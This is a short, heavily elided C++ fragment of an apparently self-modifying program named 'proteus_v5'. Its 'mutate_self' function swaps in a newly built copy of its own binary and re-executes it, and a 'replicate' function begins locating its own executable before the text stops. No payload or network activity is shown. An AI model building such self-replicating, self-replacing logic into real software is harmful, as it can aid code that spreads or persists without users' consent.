...
void mutate_self() {
    ...
    std::string source_file = "proteus_v5.cpp";
    ...
    rename("proteus_v5", "proteus_v5.old");
    rename("proteus_v5.new", "proteus_v5");
    
    // Replace current process with new kernel
    execl("./proteus_v5", "proteus_v5", NULL);
}
...
void replicate() {
    std::string exe_path = fs::current_path().string() + "/proteus_v5";
